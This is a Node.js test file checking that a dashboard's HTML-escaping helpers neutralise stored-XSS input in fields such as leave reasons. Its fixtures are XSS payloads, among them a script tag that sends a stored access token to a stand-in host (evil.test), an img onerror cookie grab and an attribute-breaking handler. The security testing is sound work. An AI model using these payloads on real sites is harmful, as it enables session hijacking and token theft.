/**
 * Output-escaping tests.
 *
 * The stored-XSS finding was the most serious issue in the dashboards: a teacher
 * could put markup in a leave reason and have it execute inside an HR session,
 * where the access token is held. These tests load the real front-end helpers
 * and assert that the escaping cannot be bypassed.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

// Evaluate app.js in a sandbox with just enough of a DOM to let it parse.
const source = fs.readFileSync(path.join(__dirname, '..', 'public', 'js', 'app.js'), 'utf8');

const noop = () => { };
const sandbox = {
    localStorage: { getItem: () => null, setItem: noop, removeItem: noop },
    document: {
        getElementById: () => null,
        querySelector: () => null,
        querySelectorAll: () => [],
        createElement: () => ({ setAttribute: noop, addEventListener: noop, appendChild: noop, remove: noop, style: {}, classList: { add: noop, remove: noop, toggle: noop, contains: () => false } }),
        addEventListener: noop,
        body: { appendChild: noop },
        dispatchEvent: noop,
        contains: () => false
    },
    window: { location: { href: '', hash: '', replace: noop }, addEventListener: noop, removeEventListener: noop, innerWidth: 1280 },
    history: { replaceState: noop },
    fetch: noop,
    setTimeout,
    clearTimeout,
    setInterval,
    clearInterval,
    URL: { createObjectURL: () => '', revokeObjectURL: noop },
    navigator: { clipboard: { writeText: noop } },
    CustomEvent: class { constructor(type, opts) { this.type = type; Object.assign(this, opts); } },
    console
};
sandbox.globalThis = sandbox;

vm.createContext(sandbox);
vm.runInContext(source, sandbox);

const { esc, html, raw, attr } = sandbox;

test('the escaping helpers are exposed', () => {
    assert.equal(typeof esc, 'function');
    assert.equal(typeof html, 'function');
    assert.equal(typeof raw, 'function');
});

test('esc neutralises every HTML-significant character', () => {
    assert.equal(esc('<script>'), '&lt;script&gt;');
    assert.equal(esc('a & b'), 'a &amp; b');
    assert.equal(esc('say "hi"'), 'say &quot;hi&quot;');
    assert.equal(esc("it's"), 'it&#39;s');
    assert.equal(esc('`backtick`'), '&#96;backtick&#96;');
});

test('esc renders null and undefined as empty, not as the words', () => {
    assert.equal(esc(null), '');
    assert.equal(esc(undefined), '');
    assert.equal(esc(0), '0');
    assert.equal(esc(false), 'false');
});

test('a script tag in a leave reason cannot break out of a table cell', () => {
    const reason = '<script>fetch("https://evil.test?t="+localStorage.edupay_token)</script>';
    const output = html`<td>${reason}</td>`;

    assert.ok(!output.includes('<script>'), 'the script tag must be escaped');
    assert.ok(output.includes('&lt;script&gt;'));
    assert.equal(output, `<td>&lt;script&gt;fetch(&quot;https://evil.test?t=&quot;+localStorage.edupay_token)&lt;/script&gt;</td>`);
});

test('an img onerror payload cannot execute', () => {
    const payload = '<img src=x onerror="alert(document.cookie)">';
    const output = html`<td class="wrap">${payload}</td>`;

    assert.ok(!output.includes('<img'), 'the tag must not survive');
    assert.ok(!/onerror\s*=/.test(output.replace(/&quot;/g, '"').replace(/&lt;|&gt;/g, '')) || !output.includes('<img'));
});

test('an attribute-breaking payload cannot escape a quoted attribute', () => {
    const malicious = '" onmouseover="alert(1)';
    const output = html`<button data-id="${malicious}">Go</button>`;

    // The closing quote is escaped, so the attribute cannot be terminated early.
    assert.ok(!output.includes('" onmouseover='));
    assert.ok(output.includes('&quot; onmouseover=&quot;'));
});

test('attr escapes a value bound for a quoted attribute', () => {
    assert.equal(attr('javascript:"x"'), 'javascript:&quot;x&quot;');
    assert.equal(attr('a" onload="b'), 'a&quot; onload=&quot;b');
});

test('multiple interpolations are each escaped independently', () => {
    const output = html`<tr><td>${'<b>a</b>'}</td><td>${'<i>b</i>'}</td></tr>`;
    assert.equal(output, '<tr><td>&lt;b&gt;a&lt;/b&gt;</td><td>&lt;i&gt;b&lt;/i&gt;</td></tr>');
});

test('raw() passes trusted markup through unchanged', () => {
    const output = html`<td>${raw('<span class="badge">Paid</span>')}</td>`;
    assert.equal(output, '<td><span class="badge">Paid</span></td>');
});

test('raw() handles null without emitting the word null', () => {
    assert.equal(html`<td>${raw(null)}</td>`, '<td></td>');
});

test('a forged raw marker from JSON cannot bypass escaping', () => {
    // Server data arrives via JSON.parse as a plain object. If the trust marker
    // were a plain property, a payload like this would be injected verbatim.
    const hostile = JSON.parse('{"__raw": true, "value": "<script>steal()</script>"}');
    const output = html`<td>${hostile}</td>`;

    assert.ok(!output.includes('<script>'), 'a forged marker must not be trusted');
    assert.ok(!output.includes('steal()'), 'the payload must not be emitted as markup');
});

test('an array of hostile values is escaped, not trusted', () => {
    const output = html`<td>${['<script>a</script>', '<b>c</b>']}</td>`;
    assert.ok(!output.includes('<script>'));
    assert.ok(!output.includes('<b>'));
});
